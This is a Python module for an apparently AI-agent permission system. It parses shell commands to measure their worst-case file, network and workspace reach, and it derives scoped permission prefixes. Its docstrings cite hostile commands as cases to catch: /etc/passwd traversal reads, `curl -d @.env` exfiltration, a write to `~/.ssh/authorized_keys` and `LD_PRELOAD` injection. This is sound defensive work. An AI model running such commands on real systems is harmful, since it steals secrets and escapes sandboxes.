r"""Reading a shell command's worst case off its grammar.

Split from ``capability.py``: this file changes when the grammar grows a construct, that
one when a tool is added.

**Why a real parser.** Regexes over shell syntax are wrong on the cases that matter: a `;`
inside a quoted string, a `$(…)` inside a `"…"`, a redirect glued to a word.
`tree-sitter-bash` recovers from errors instead of throwing, so a command it cannot parse
comes back as a tree with error nodes, which are treated as unreadable. `bashlex` is
unmaintained and breaks on ordinary bashisms.

**Every unread construct is recorded, never skipped.** A skipped node would shrink the
described worst case below the real one, and the consumer would clear a command on the
strength of the part that parsed.

**A word is literal only if the shell would hand it over unchanged.** The tree gives the
text as written; between that and what the program receives sit brace expansion, globbing
and backslash removal. `cat .\./etc/passwd`, `cat \/etc/passwd`, `cat {..,}/etc/passwd` and
`cat .[.]/.[.]/etc/passwd` all read `/etc/passwd` under `/bin/sh` while naming no `..` and
no leading slash as written. A bare word carrying any of those characters is recorded as
unbounded, like a `$VAR`: the value arrives later.

**A word is an operand only if the program reads it as one.** `sh -c 'cat /etc/passwd'` is
one word to the shell and a command line to `sh`. Measured as a relative path it lands
inside the worktree and the command reads as contained. Telling that apart from
`git commit -m 'fix the parser'` by program would need the program table that was removed;
by what the words name it needs none. A quoted argument with spaces is measured word by
word, so `sh -c 'cat /etc/passwd'` is refused for its `/etc/passwd` and the commit message
clears. An argument carrying parser syntax (:data:`_COMPOSITE`) cannot be placed and is
recorded as unbounded. What remains is a script whose every word stays inside the worktree,
which the fence holds.

**Every word is measured, not only operands.** The program itself (`~/evil.sh`,
`/etc/../bin/ls`) and an assignment's value (`GIT_DIR=../../other/.git`,
`LD_PRELOAD=/abs/x.so`) are paths as plainly as anything after `cat`. A bare program name
is the exception: it resolves through `PATH`, which the command line did not write.

**Not covered.** A command that takes its paths from bytes at run time (`xargs cat < list`,
a script the model just wrote) names nothing readable here. The fence answers that class:
a VM command runs in the conversation VM, which mounts only the host folders it was given
and reaches only the allowlisted hosts.
"""

from __future__ import annotations

import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass, field

import tree_sitter_bash
from tree_sitter import Language, Node, Parser

from services.permissions.fence import Fence, escapes
from services.permissions.shell_flags import attached_value, is_flag

_LANGUAGE = Language(tree_sitter_bash.language())
_PARSER = Parser(_LANGUAGE)

# Operators are listed by literal text because that is how the grammar names an anonymous node.
_STRUCTURE = frozenset({"program", "list", "pipeline", "redirected_statement"})
_IGNORED = frozenset({"&&", "||", "|", "|&", ";", ";;", "&", "\n", "comment"})

_LITERAL = frozenset({"word", "number", "raw_string"})

# What the shell still does to a bare word that this walk cannot follow: brace expansion,
# a bracket class, backslash removal, a backtick's substitution.
_EXPANDED_UNQUOTED = frozenset("\\{}[]`")

# Not in the set above: a glob matches only names inside the directory its fixed prefix
# names, which :meth:`_Walk._glob` measures. A pattern leaves that directory only by
# matching `..`, and `/bin/sh` allows that only for a segment starting with a literal dot
# (`.[.]`, `.?`, `.*`), so that shape stays unread.
_GLOB = frozenset("*?")

# Inside double quotes globbing and braces are suppressed; a backslash and a backtick are not.
_EXPANDED_IN_QUOTES = frozenset("\\`")

# A word carrying one of these is not placed against the workspace at all. Whitespace and
# the glob characters are deliberately absent: a quoted argument with spaces is read word by
# word (:meth:`_Walk._reach_words`), and `find . -name '*.py'` hands a pattern to `find`
# that cannot leave the directory.
_COMPOSITE = frozenset(";|&<>()$`")

#: How many operands :func:`command_prefixes` keeps. Past three a prefix stops naming the
#: act and starts naming its target, which a grant must not be scoped to. Flags are kept
#: and not counted: an option says what the act is, not what it is done to.
_PREFIX_WORDS = 3

# Each is named in the refusal: which part could not be read is the operator's first question.
_DYNAMIC = {
    "simple_expansion": "a variable whose value is not known here",
    "expansion": "a parameter expansion whose value is not known here",
    "command_substitution": "a nested command whose output becomes an argument",
    "process_substitution": "a nested command substituted as a file",
    "arithmetic_expansion": "an arithmetic expansion",
}

#: Names the doubt, not the program: `python3 -c 'print(1)'` and `git commit -m 'fix (again)'`
#: are the same shape and only one is a program.
_COMPOSITE_UNREAD = "an argument carrying shell syntax that a program could run as a command line"

_EXPANDS_UNREAD = "a word the shell would expand or unescape"

#: `/bin/sh` lets `.?`, `.*` and `.[.]` match `..`, and a pattern that can name `..` can name
#: anything above it.
_PARENT_GLOB_UNREAD = "a pattern that could match the parent directory"

#: Splits a quoted script's word at whatever a path is not written with, so a path glued to
#: quotes, commas or brackets by a program's syntax is still placed.
_PATH_FRAGMENT = re.compile(r"[^\w./~*?-]+")

_COMPOSITE_PROGRAM_UNREAD = "a program name that is more than one word"


@dataclass(frozen=True)
class ShellCommand:
    """One command inside a shell action: the program and the words it was given.

    ``arguments`` is every literal argument in order, flags included: a flag separates
    `find .` from `find . -delete`, and is where a path hides.
    """

    program: str
    arguments: tuple[str, ...] = ()


#: Programs that run the command written after their own options.
WRAPPERS = frozenset(
    {
        "sudo",
        "doas",
        "env",
        "command",
        "exec",
        "nohup",
        "nice",
        "time",
        "builtin",
        "timeout",
        "setsid",
        "stdbuf",
        "caffeinate",
        "arch",
        "chronic",
        "watch",
        "flock",
    }
)

#: Options of a wrapper that consume the next word.
WRAPPER_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "sudo": frozenset({"-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "-r", "-t"}),
    "doas": frozenset({"-u", "-C"}),
    "env": frozenset({"-u", "--unset", "-C", "--chdir"}),
    "nice": frozenset({"-n"}),
    "timeout": frozenset({"-s", "-k"}),
    "exec": frozenset({"-a"}),
    "caffeinate": frozenset({"-t", "-w"}),
    "watch": frozenset({"-n", "-d"}),
    "flock": frozenset({"-w", "-E"}),
}

#: Wrappers whose first operand is not the command: the duration, the lock file.
_LEADING_OPERAND = frozenset({"timeout", "flock"})

#: Stands for a word the shell fills in at run time.
OPAQUE = "￼"

_UNWRAP_DEPTH = 4


def operands(arguments: Sequence[str], value_flags: frozenset[str] | None = None) -> list[str]:
    """The non-flag words of ``arguments``: the value of each flag in ``value_flags`` is
    skipped, and every word after a bare ``--`` is an operand."""
    skipped = value_flags or frozenset()
    found: list[str] = []
    skip = False
    literal = False
    for word in arguments:
        if skip:
            skip = False
        elif literal:
            found.append(word)
        elif word == "--":
            literal = True
        elif word in skipped:
            skip = True
        elif not is_flag(word):
            found.append(word)
    return found


def option_values(
    arguments: tuple[str, ...], short: str | None, long: tuple[str, ...]
) -> list[str]:
    """The values given to one option, in every spelling: ``-o F``, ``-oF``, ``-so F``,
    ``--output F`` and ``--output=F``."""
    values: list[str] = []
    index = 0
    while index < len(arguments):
        word = arguments[index]
        if word == "--":
            break
        matched = False
        for flag in long:
            if word == flag and index + 1 < len(arguments):
                values.append(arguments[index + 1])
                index += 1
                matched = True
                break
            if word.startswith(flag + "="):
                values.append(word[len(flag) + 1 :])
                matched = True
                break
        if not matched and short and word.startswith("-") and not word.startswith("--"):
            body = word[1:]
            position = body.find(short)
            if position != -1:
                attached = body[position + 1 :]
                if attached:
                    values.append(attached)
                elif index + 1 < len(arguments):
                    values.append(arguments[index + 1])
                    index += 1
        index += 1
    return values


def unwrap(one: ShellCommand) -> ShellCommand:
    """The command a wrapper such as ``sudo`` or ``env`` runs, however deeply wrapped.

    ``env -S 'string'`` is returned as a shell running the string. Wrappers nested past
    the depth limit come back as an unknown program, so a deep chain cannot hide one.
    """
    for _ in range(_UNWRAP_DEPTH):
        name = one.program.rsplit("/", 1)[-1]
        if name not in WRAPPERS:
            return one
        words = list(one.arguments)
        value_flags = WRAPPER_VALUE_FLAGS.get(name, frozenset())
        index = 0
        while index < len(words):
            word = words[index]
            if name == "env" and word in ("-S", "--split-string") and index + 1 < len(words):
                return ShellCommand("sh", ("-c", words[index + 1]))
            if word in value_flags:
                index += 2
            elif is_flag(word) or (name == "env" and "=" in word):
                index += 1
            else:
                break
        if name in _LEADING_OPERAND:
            index += 1
        rest = words[index:]
        if not rest:
            return one
        one = ShellCommand(program=rest[0], arguments=tuple(rest[1:]))
    if one.program.rsplit("/", 1)[-1] in WRAPPERS:
        return ShellCommand(OPAQUE, one.arguments)
    return one


@dataclass(frozen=True)
class ShellReach:
    """What one command would touch, as the walk found it."""

    commands: tuple[ShellCommand, ...] = ()
    reads: tuple[str, ...] = ()
    writes: tuple[str, ...] = ()
    env_writes: tuple[str, ...] = ()
    network: bool = False
    escapes: tuple[str, ...] = ()
    unbounded: tuple[str, ...] = field(default_factory=tuple)


def shell_reach(command: str, *, root: Fence | None) -> ShellReach:
    """What one shell command would reach, read off its syntax.

    ``root`` is what every path argument is measured against: the run's workspace
    directory or the thread's home. None when the turn has neither, in which case nothing
    can be placed and every absolute or upward path reads as an escape.
    """
    walk = _Walk(root)
    tree = _PARSER.parse(command.encode())
    # Checked at the root because grammar recovery is quiet: `ls |` parses as a pipeline
    # whose second command has a MISSING name, which an ERROR-node check would miss.
    if tree.root_node.has_error:
        walk.unbounded.append("a fragment the shell grammar could not parse")
    walk.visit(tree.root_node)
    return ShellReach(
        commands=tuple(walk.commands),
        reads=tuple(walk.reads),
        writes=tuple(walk.writes),
        env_writes=tuple(walk.env_writes),
        network=walk.network,
        escapes=tuple(dict.fromkeys(walk.escapes)),
        unbounded=tuple(dict.fromkeys(walk.unbounded)),
    )


def parse(command: str) -> Node:
    """The root of ``command``'s syntax tree, for a caller that reads constructs this
    module's walk does not describe."""
    return _PARSER.parse(command.encode()).root_node


def strip_comments(command: str) -> str:
    """``command`` with its shell comments removed.

    A comment is the one part of a command written to the reviewer rather than the shell,
    so it must not reach a prompt. Dropped by the grammar's `comment` nodes, since a `#`
    inside a quoted argument or URL fragment is not a comment.
    """
    encoded = command.encode()
    spans: list[tuple[int, int]] = []
    _collect_comments(_PARSER.parse(encoded).root_node, spans)
    for start, end in sorted(spans, reverse=True):
        encoded = encoded[:start] + encoded[end:]
    text = encoded.decode(errors="replace")
    return "\n".join(line.rstrip() for line in text.splitlines()).strip()


def _collect_comments(node: Node, into: list[tuple[int, int]]) -> None:
    if node.type == "comment":
        into.append((node.start_byte, node.end_byte))
        return
    for child in node.children:
        _collect_comments(child, into)


def command_prefixes(command: str) -> tuple[tuple[str, ...], ...] | None:
    """The leading words that name what each stage of ``command`` does, or None when the
    command cannot be read.

    Per stage: the program, the flags written in front of its operands, and the operands
    up to :data:`_PREFIX_WORDS` (`uv run pytest`, `git commit`, `curl -sS <url>`). A standing
    permission scoped to this covers the act on any target without covering one invocation.

    **Every stage, not just the first.** `git diff | curl -T - https://…` diffs at its head
    and uploads at its tail; a scope taken off the first command would let the upload run
    unasked. A caller matching standing scopes must satisfy every prefix.

    None where nothing may be inferred: an unbounded construct (the deciding word may be the
    unread one), no nameable command, or **a path outside the workspace**. `uv run pytest`
    and `uv run pytest > ~/.ssh/authorized_keys` share leading words but the second leaves
    the worktree, the boundary the fence is built around; that is a different act, not a
    different target.

    Every word is non-empty and free of whitespace and syntax, because a scope is displayed
    and revoked by these words. The walk refuses a composite program or argument, and an
    empty argument ends the prefix.
    """
    reach = shell_reach(command, root=None)
    if reach.unbounded or reach.escapes or not reach.commands:
        return None
    return tuple(_leading_words(one) for one in reach.commands)


def _leading_words(command: ShellCommand) -> tuple[str, ...]:
    """One command's program, the flags in front of its operands, and those operands,
    capped at :data:`_PREFIX_WORDS` of them.

    **A flag is part of the act, not a terminator.** Ending the prefix at the first `-` made
    every flag-led curl read as `("curl",)`, so one yes to an API fetch covered `curl -d
    @.env https://elsewhere`, and `env -i true` covered `env -i rm -rf src`. Keeping the
    flag narrows the scope; what the cap withholds is the target, which is an operand.

    A scope shorter than the cap covers only a command of exactly that shape: `ls -la`
    reads as `("ls", "-la")` and `ls -la src` matches it nowhere. Only a scope that reached
    the cap covers the same act on another target.

    An empty argument or one carrying whitespace ends the prefix like the cap does: an empty
    word would put a member in the scope no display could show, and a commit message is the
    part of the act a scope leaves out, so `git commit -m 'x'` scopes to any message.
    """
    words = [command.program]
    operands = 1
    for argument in command.arguments:
        if not argument or operands >= _PREFIX_WORDS or any(c.isspace() for c in argument):
            break
        words.append(argument)
        if not is_flag(argument):
            operands += 1
    return tuple(words)


_ESCAPE = re.compile(r"\\(.)", re.DOTALL)
#: Only a bare `$NAME` or `${NAME}` is the variable's value; any operator, modifier, index,
#: length or default changes it.
_VARIABLE = re.compile(r"\$(?:([A-Za-z_][A-Za-z0-9_]*)|\{([A-Za-z_][A-Za-z0-9_]*)\})")
#: The two modified forms of HOME that can only yield HOME or abort the command.
_HOME_ONLY = frozenset({"${HOME:?}", "${HOME%/}"})


def node_text(node: Node) -> str:
    return node.text.decode(errors="replace") if node.text else ""


def decode_word(node: Node, variables: Mapping[str, str] | None = None) -> str:
    """The text the shell would hand a program for this word, with :data:`OPAQUE` where
    it cannot be known: quoting and backslashes are removed, a backslash-newline joins the
    lines, ``$HOME`` is ``~`` and any other variable is its value in ``variables`` if it
    has one."""
    kind = node.type
    if kind in ("word", "number"):
        return _ESCAPE.sub(r"\1", node_text(node).replace("\\\n", ""))
    if kind == "raw_string":
        return node_text(node)[1:-1]
    if kind == "ansi_c_string":
        return node_text(node)[2:-1]
    if kind in ("simple_expansion", "expansion"):
        text = node_text(node)
        if text in _HOME_ONLY:
            return "~"
        found = _VARIABLE.fullmatch(text)
        name = (found.group(1) or found.group(2)) if found else None
        if name is not None and variables is not None and name in variables:
            return variables[name]
        return "~" if name == "HOME" else OPAQUE
    if kind in ("string", "concatenation"):
        return "".join(decode_word(c, variables) for c in node.children if c.type != '"')
    if kind == "string_content":
        return node_text(node).replace("\\\n", "")
    return OPAQUE


def _literal(node: Node) -> str | None:
    """The fixed text of an argument node, or None when it is decided at run time.

    That covers substitutions (`"$HOME/foo"` is not `"foo"`) and words the shell rewrites
    before the program sees them: a brace, a glob, a bracket class or a backslash escape.
    """
    if node.type == "concatenation":
        parts = [_literal(child) for child in node.children]
        if any(part is None for part in parts):
            return None
        return "".join(part for part in parts if part is not None)
    text = node_text(node)
    if node.type in _LITERAL:
        # Single quotes suppress every expansion.
        if node.type != "raw_string" and _expands(text, _EXPANDED_UNQUOTED):
            return None
    elif node.type == "string":
        if any(child.type in _DYNAMIC for child in node.children):
            return None
        if _expands(text, _EXPANDED_IN_QUOTES):
            return None
    else:
        return None
    value = decode_word(node)
    return None if OPAQUE in value else value


def _expands(text: str, characters: frozenset[str]) -> bool:
    """Whether the shell would still do something to ``text`` before passing it on."""
    return any(character in text for character in characters)


def _composite(value: str) -> bool:
    """Whether ``value`` is more than the one word a containment check can measure."""
    return _expands(value, _COMPOSITE)


def _unreadable(node: Node) -> str:
    """Why this node's text is not a value: a gap in this module, or a word the shell rewrites."""
    text = node.text.decode(errors="replace") if node.text else ""
    if _expands(text, _EXPANDED_UNQUOTED):
        return _EXPANDS_UNREAD
    return f"an argument of a kind not read here ({node.type})"


class _Walk:
    """One pass over a parsed command, accumulating what it would reach."""

    def __init__(self, root: Fence | None) -> None:
        self._root: Fence | None = root
        self.commands: list[ShellCommand] = []
        self.reads: list[str] = []
        self.writes: list[str] = []
        self.env_writes: list[str] = []
        self.escapes: list[str] = []
        self.unbounded: list[str] = []
        self.network: bool = False

    def visit(self, node: Node) -> None:
        if node.is_error or node.type == "ERROR":
            self.unbounded.append("a fragment the shell grammar could not parse")
            return
        if node.type in _IGNORED:
            return
        if node.type in _STRUCTURE:
            for child in node.children:
                self.visit(child)
            return
        if node.type == "command":
            self._command(node)
            return
        if node.type == "file_redirect":
            self._redirect(node)
            return
        if node.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[node.type])
            return
        # A subshell, loop, function, conditional or heredoc. The node type tells the reader
        # which rule is missing.
        self.unbounded.append(f"an unrecognised shell construct ({node.type})")

    def _command(self, node: Node) -> None:
        program: str | None = None
        arguments: list[str] = []
        for child in node.children:
            if child.type == "variable_assignment":
                self._assignment(child)
            elif child.type == "command_name":
                program = _literal(child.children[0]) if child.child_count else None
                if not program:
                    # A MISSING name node reads as the empty string.
                    program = None
                    self.unbounded.append("a program name assembled at run time")
                elif _composite(program) or any(c.isspace() for c in program):
                    # Stricter than _argument: `'my prog'` would read as a relative path
                    # inside the worktree, and a program cannot be read word by word
                    # because which word runs is what is unknown.
                    program = None
                    self.unbounded.append(_COMPOSITE_PROGRAM_UNREAD)
                else:
                    # Running a file reads it, which no fence bounds. A bare name resolves
                    # through `PATH` and is not measured (:func:`_names_a_path`).
                    self._reach(program)
            elif child.type == "file_redirect":
                self._redirect(child)
            else:
                word = self._argument(child)
                if word is not None:
                    arguments.append(word)
        if program is not None:
            self.commands.append(ShellCommand(program, tuple(arguments)))

    def _assignment(self, node: Node) -> None:
        """One `NAME=value` prefix: the name for the record, the value measured like an
        operand, so `GIT_DIR=../../other/.git git log` does not read as contained."""
        name = node.child_by_field_name("name")
        self.env_writes.append(
            name.text.decode(errors="replace") if name and name.text else "an environment variable"
        )
        value = node.child_by_field_name("value")
        if value is None:
            return
        if value.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[value.type])
            return
        literal = _literal(value)
        if literal is None:
            self.unbounded.append(_unreadable(value))
            return
        if _composite(literal):
            self.unbounded.append(_COMPOSITE_UNREAD)
            return
        words = literal.split()
        if len(words) > 1:
            self._reach_words(words)
            return
        self._reach(literal)

    def _redirect(self, node: Node) -> None:
        # Input redirects count as writes too: over-reporting only escalates.
        # The `destination` field is used because scanning children for a literal would
        # record `> $OUT` and `> {a,b}` as redirects to nowhere.
        target = node.child_by_field_name("destination")
        if target is None:
            self.unbounded.append(f"a redirect with no destination to read ({node.type})")
            return
        if target.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[target.type])
            return
        value = _literal(target)
        if value is None:
            self.unbounded.append(_unreadable(target))
            return
        self._path(value, self.writes)

    def _argument(self, node: Node) -> str | None:
        """One argument's literal text, recorded against the worst case as it goes.

        A flag reaches as far as the value glued to it: `--output=/etc/passwd` and
        `-o/etc/passwd` name that file as plainly as a separate word.

        A quoted argument with spaces is measured word by word (:meth:`_reach_words`), not
        as one relative path, which is how every `sh -c` once cleared. One carrying syntax
        a program would run is not placed at all.
        """
        if node.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[node.type])
            return None
        value = _literal(node)
        if value is None:
            self.unbounded.append(_unreadable(node))
            return None
        if _composite(value):
            self.unbounded.append(_COMPOSITE_UNREAD)
            return None
        words = value.split()
        if len(words) > 1:
            self._reach_words(words)
            return value
        if is_flag(value):
            attached = attached_value(value)
            if attached is not None:
                self._reach(attached)
        else:
            self._reach(value)
        return value

    def _reach(self, word: str) -> None:
        """What one word (a program, an operand, or a flag's value) would touch.

        A `NAME=value` word is measured whole and again after its first `=`:
        `env LD_PRELOAD=/tmp/x.so ls` puts the assignment in an argument, where read whole
        it is a relative path inside the worktree. A URL is left whole; its query string
        is not a path.
        """
        self._measure(word)
        if "://" in word:
            return
        name, separator, value = word.partition("=")
        if separator and name and value:
            self._measure(value)

    def _reach_words(self, words: list[str]) -> None:
        """A quoted argument's words, each measured as the program it is handed to might.

        `sh -c 'cat /etc/passwd'` is refused for its path and `git commit -m 'fixed the
        parser'` clears, with no program table. A word the inner shell would rewrite
        (`\\/etc/passwd`, `{..,}/x`) is refused as unread, as on the outer line.
        """
        for word in words:
            if _expands(word, _EXPANDED_UNQUOTED):
                self.unbounded.append(_EXPANDS_UNREAD)
                return
            if "://" in word:
                self.network = True
                continue
            # `open F, "/etc/passwd"` glues the path to quotes; measured whole it would be
            # a relative path inside the worktree.
            for fragment in _PATH_FRAGMENT.split(word):
                if fragment:
                    self._measure(fragment)

    def _measure(self, word: str) -> None:
        """One string, placed: an address off this machine, a pattern, a path, or none."""
        if "://" in word:
            self.network = True
        elif _expands(word, _GLOB):
            self._glob(word)
        elif _names_a_path(word):
            self._path(word, self.reads)

    def _glob(self, pattern: str) -> None:
        """A pattern, placed by the directory its fixed prefix names (`src/*.py` under
        `src/`). A segment that could match `..` is refused instead."""
        for segment in pattern.split("/"):
            if _expands(segment, _GLOB) and segment.startswith("."):
                self.unbounded.append(_PARENT_GLOB_UNREAD)
                return
        fixed = pattern[: min(pattern.index(c) for c in _GLOB if c in pattern)]
        directory = fixed[: fixed.rfind("/") + 1]
        if directory:
            self._path(directory, self.reads)

    def _path(self, raw: str, into: list[str]) -> None:
        into.append(raw)
        if escapes(self._root, raw):
            self.escapes.append(raw)


def _names_a_path(word: str) -> bool:
    """Whether a word could reach out of the directory the command runs in.

    A bare word is at worst a file beside the others; recording each as a read would bury
    the real ones under grep patterns.
    """
    return "/" in word or word.startswith("~") or word in {".", ".."}
